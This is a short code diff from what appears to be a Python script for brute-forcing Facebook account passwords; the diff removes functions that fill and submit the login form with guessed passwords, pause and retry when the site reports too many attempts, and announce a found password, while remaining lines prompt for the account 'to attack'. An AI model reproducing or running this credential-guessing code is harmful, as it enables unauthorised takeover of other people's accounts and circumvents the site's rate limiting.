@@ -25,26 +25,6 @@ def setup_browser(self):
     browser.set_handle_refresh(False)
     return browser
 
-def send_login(self, email, password):
-    self.browser.open(self.LOGIN_URL)
-    self.browser.select_form(nr=0)
-    self.browser.form['email'] = email
-    self.browser.form['pass'] = password
-    return self.browser.submit().read()
-
-def try_password(self, email, password):
-    print ('Trying %s' % password)
-    data = self.send_login(email, password)
-
-    if self.is_too_often(data):
-        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
-        sleep(30)
-        self.try_password(password)
-
-    if self.is_logged_in(data):
-        print ('Password found: %s' % password )
-        sys.exit()
-
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
 """password = input('Password:')"""
